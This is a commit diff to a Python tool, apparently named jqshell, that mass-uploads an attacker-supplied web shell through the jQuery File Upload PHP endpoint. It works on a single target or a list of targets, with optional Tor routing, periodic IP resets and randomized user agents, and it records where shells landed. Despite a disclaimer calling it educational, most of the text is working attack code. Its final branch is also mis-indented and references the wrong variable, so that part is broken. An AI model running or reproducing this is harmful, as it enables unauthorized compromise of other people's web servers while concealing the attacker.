ce6e97d71ff209b43ab1d6d72443ddd03057438c
Joshua Whitaker <joshwhitaker@hotmail.com>
2018-10-29 20:41:21 -0500

    Fixed logic and iorganized bad looking code

--- jqshell.py
+++ jqshell.py
@@ -10,12 +10,17 @@ from misc import colors
 """Email: stahl@stahl.io"""
 
 """Initalizing Classes"""
+global initall
 initall = redundant()
+global colors
 initcolor = colors()
 
 """Misc Vars"""
+global write_output
 write_output = False
-set_tor_reset_interval = 1
+global set_tor_reset_interval
+set_tor_reset_interval = 5
+global tor_count
 tor_count = 0
 
 art = (
@@ -34,6 +39,7 @@ print(initcolor.WARNING + 'Using this agianst servers you dont control, is illeg
 print(initcolor.WARNING + 'The author claims no responsibility for the actions of those who use this software for illegal purposes.' + initcolor.ENDC)
 print(initcolor.WARNING + 'This software is intended for educational use only.'  + initcolor.ENDC)
 
+
 """Argparse block"""
 parser = argparse.ArgumentParser()
 parser.add_argument('-l','--list', dest='list_init', required=False, help='Select for a list of assets to exploit')
@@ -42,7 +48,6 @@ parser.add_argument('-s','--shell', dest='shell_loc', required=True, help='This 
 parser.add_argument('-o','--output', dest='outputz', required=False, help='This is full path to were you want to save your list of confirmed hosts')
 parser.add_argument('-tor','--tor_proxy', action='store_true', dest='torproxy', help='Select if you have tor installed, you will need to enable control port', required=False, default=False)
 args = parser.parse_args()
-
 
 """If Block for exiting if requirements aern't meant"""
 if (args.list_init == None) and (args.single_target == None):
@@ -84,99 +89,82 @@ if args.torproxy == True:
 
 
 """Session for building concurrency"""
+global request
 request = requests.Session()
 
 """Get Shell Name"""
+global shell_name
 shell_name = initall.shell_name(args.shell_loc)
 
 """Shell upload to Server"""
+global files
 files = {'files':('{0}'.format(shell_name), open(args.shell_loc, 'rb'), 'multipart/form-data')}
+
+def http(domain):
+  if args.torproxy == True:
+    upload_shell = request.post('{0}/server/php/index.php'.format(domain), files=files, proxies=proxies, headers=initall.random_agent())
+    shell_location = '{0}'.format(domain) + '/server/php/files/' + '{0}'.format(shell_name)
+    if upload_shell.status_code == 200:
+      print(initcolor.OKGREEN + '[*] Potential Shell Uploaded, check in: {0}'.format(shell_location) + initcolor.ENDC)
+      if write_output == True:
+        initall.write_me(args.outputz,shell_location)
+    elif upload_shell.status_code != 200:
+      print(initcolor.FAIL + '[-] Appears the site is not vulnerable: {0}'.format(domain) + initcolor.ENDC)
+  elif args.torproxy == False:
+    upload_shell = request.post('{0}/server/php/index.php'.format(domain), files=files, headers=initall.random_agent())
+    shell_location = '{0}'.format(domain) + '/server/php/files/' + '{0}'.format(shell_name)
+    if upload_shell.status_code == 200:
+      print(initcolor.OKGREEN + '[*] Potential Shell Uploaded, check in: {0}'.format(shell_location) + initcolor.ENDC)
+      if write_output == True:
+        initall.write_me(args.outputz,shell_location)
+    elif upload_shell.status_code != 200:
+      print(initcolor.FAIL + '[-] Appears the site is not vulnerable: {0}'.format(domain) + initcolor.ENDC)
+
+def https(domain):
+  if args.torproxy == True:
+    upload_shell = request.post('{0}/server/php/index.php'.format(domain), files=files, proxies=proxies, headers=initall.random_agent())
+    shell_location = '{0}'.format(domain) + '/server/php/files/' + '{0}'.format(shell_name)
+    if upload_shell.status_code == 200:
+      print(initcolor.OKGREEN + '[*] Potential Shell Uploaded, check in: {0}'.format(shell_location) + initcolor.ENDC)
+      if write_output == True:
+        initall.write_me(args.outputz,shell_location)
+    elif upload_shell.status_code != 200:
+      print(initcolor.FAIL + '[-] Appears the site is not vulnerable: {0}'.format(domain) + initcolor.ENDC)
+  elif args.torproxy == False:
+    upload_shell = request.post('{0}/server/php/index.php'.format(domain), files=files, headers=initall.random_agent())
+    shell_location = '{0}'.format(domain) + '/server/php/files/' + '{0}'.format(shell_name)
+    if upload_shell.status_code == 200:
+      print(initcolor.OKGREEN + '[*] Potential Shell Uploaded, check in: {0}'.format(shell_location) + initcolor.ENDC)
+      if write_output == True:
+        initall.write_me(args.outputz,shell_location)
+    elif upload_shell.status_code != 200:
+      print(initcolor.FAIL + '[-] Appears the site is not vulnerable: {0}'.format(domain) + initcolor.ENDC)
 
 """Target Logic"""
 if args.single_target != None:
-  if args.torproxy == True:
-    try:
-      upload_shell = request.post('http://{0}/server/php/index.php'.format(args.single_target), files=files, proxies=proxies, headers=initall.random_agent())
-      shell_location = 'http://' + '{0}'.format(args.single_target) + '/server/php/files/' + '{0}'.format(shell_name)
-      if upload_shell.status_code == 200:
-        print(initcolor.OKGREEN + '[*] Potential Shell Uploaded, check in: {0}'.format(shell_location) + initcolor.ENDC)
-        if write_output == True:
-          initall.write_me(args.outputz,shell_location)
-      elif upload_shell.status_code != 200:
-        print(initcolor.FAIL + '[-] Appears the site is not vulnerable: {0}'.format(args.single_target) + initcolor.ENDC)
-    except Exception as R:
-      upload_shell = request.post('https://{0}/server/php/index.php'.format(args.single_target), files=files, proxies=proxies, headers=initall.random_agent())
-      shell_location = 'https://' + '{0}'.format(args.single_target) + '/server/php/files/' + '{0}'.format(shell_name)
-      if upload_shell.status_code == 200:
-        print(initcolor.OKGREEN + '[*] Potential Shell Uploaded, check in: {0}'.format(shell_location) + initcolor.ENDC)
-        if write_output == True:
-          initall.write_me(args.outputz,shell_location)
-      elif upload_shell.status_code != 200:
-        print(initcolor.FAIL + '[-] Appears the site is not vulnerable: {0}'.format(args.single_target) + initcolor.ENDC)
-  elif args.torproxy == False:
-      try:
-        upload_shell = request.post('http://{0}/server/php/index.php'.format(args.single_target), files=files, headers=initall.random_agent())
-        shell_location = 'http://' + '{0}'.format(args.single_target) + '/server/php/files/' + '{0}'.format(shell_name)
-        if upload_shell.status_code == 200:
-          print(initcolor.OKGREEN + '[*] Potential Shell Uploaded, check in: {0}'.format(shell_location) + initcolor.ENDC)
-          if write_output == True:
-            initall.write_me(args.outputz,shell_location)
-        elif upload_shell.status_code != 200:
-          print(initcolor.FAIL + '[-] Appears the site is not vulnerable: {0}'.format(args.single_target) + initcolor.ENDC)
-      except Exception as R:
-        upload_shell = request.post('https://{0}/server/php/index.php'.format(args.single_target), files=files, headers=initall.random_agent())
-        shell_location = 'http://' + '{0}'.format(args.single_target) + '/server/php/files/' + '{0}'.format(shell_name)
-        if upload_shell.status_code == 200:
-          print(initcolor.OKGREEN + '[*] Potential Shell Uploaded, check in: {0}'.format(shell_location) + initcolor.ENDC)
-          if write_output == True:
-            initall.write_me(args.outputz,shell_location)
-        elif upload_shell.status_code != 200:
-          print(initcolor.FAIL + '[-] Appears the site is not vulnerable: {0}'.format(args.single_target) + initcolor.ENDC)
+  if 'http://' in args.single_target:
+    http(args.single_target)
+  elif 'https://' in args.single_target:
+    https(args.single_target)
+  else:
+    domain = 'http://{0}'.format(args.single_target)
+    http(domain)
 elif args.list_init != None:
   for domain in output:
     if tor_count >= set_tor_reset_interval:
       print(initcolor.OKGREEN + '[*] Reseting Tor Connection' + initcolor.ENDC)
       initall.reset_tor_ip()
       tor_count = 0
-    if args.torproxy == True:
-      try:
-        upload_shell = request.post('http://{0}/server/php/index.php'.format(domain), files=files, proxies=proxies, headers=initall.random_agent())
-        shell_location = 'http://' + '{0}'.format(domain) + '/server/php/files/' + '{0}'.format(shell_name)
-        if upload_shell.status_code == 200:
-          tor_count += 1
-          print('Tor Count: {0}'.format(tor_count))
-          print(initcolor.OKGREEN + '[*] Potential Shell Uploaded, check in: {0}'.format(shell_location) + initcolor.ENDC)
-          if write_output == True:
-            initall.write_me(args.outputz,shell_location)
-        elif upload_shell.status_code != 200:
-          print(initcolor.FAIL + '[-] Appears the site is not vulnerable: {0}'.format(domain) + initcolor.ENDC)
-      except Exception as R:
-        upload_shell = request.post('https://{0}/server/php/index.php'.format(domain), files=files, proxies=proxies, headers=initall.random_agent())
-        shell_location = 'https://' + '{0}'.format(domain) + '/server/php/files/' + '{0}'.format(shell_name)
-        if upload_shell.status_code == 200:
-          tor_count += 1
-          print('Tor Count: {0}'.format(tor_count))
-          print(initcolor.OKGREEN + '[*] Potential Shell Uploaded, check in: {0}'.format(shell_location) + initcolor.ENDC)
-          if write_output == True:
-            initall.write_me(args.outputz,shell_location)
-        elif upload_shell.status_code != 200:
-          print(initcolor.FAIL + '[-] Appears the site is not vulnerable: {0}'.format(domain) + initcolor.ENDC)
-    elif args.torproxy == False:
-      try:
-        upload_shell = request.post('http://{0}/server/php/index.php'.format(domain), files=files, headers=initall.random_agent())
-        shell_location = 'http://' + '{0}'.format(domain) + '/server/php/files/' + '{0}'.format(shell_name)
-        if upload_shell.status_code == 200:
-          print(initcolor.OKGREEN + '[*] Potential Shell Uploaded, check in: {0}'.format(shell_location) + initcolor.ENDC)
-          if write_output == True:
-            initall.write_me(args.outputz,shell_location)
-        elif upload_shell.status_code != 200:
-          print(initcolor.FAIL + '[-] Appears the site is not vulnerable: {0}'.format(domain) + initcolor.ENDC)
-      except Exception as R:
-        upload_shell = request.post('https://{0}/server/php/index.php'.format(domain), files=files, headers=initall.random_agent())
-        shell_location = 'http://' + '{0}'.format(domain) + '/server/php/files/' + '{0}'.format(shell_name)
-        if upload_shell.status_code == 200:
-          print(initcolor.OKGREEN + '[*] Potential Shell Uploaded, check in: {0}'.format(shell_location) + initcolor.ENDC)
-          if write_output == True:
-            initall.write_me(args.outputz,shell_location)
-        elif upload_shell.status_code != 200:
-          print(initcolor.FAIL + '[-] Appears the site is not vulnerable: {0}'.format(domain) + initcolor.ENDC)
+    if 'http://' in domain:
+      if args.torproxy == True:
+        tor_count += 1
+      http(domain)
+    elif 'https://' in domain:
+      if args.torproxy == True:
+        tor_count += 1
+      https(domain)
+    else:
+      if args.torproxy == True:
+        tor_count += 1
+          domain = 'http://{0}'.format(args.single_target)
+      http(domain)
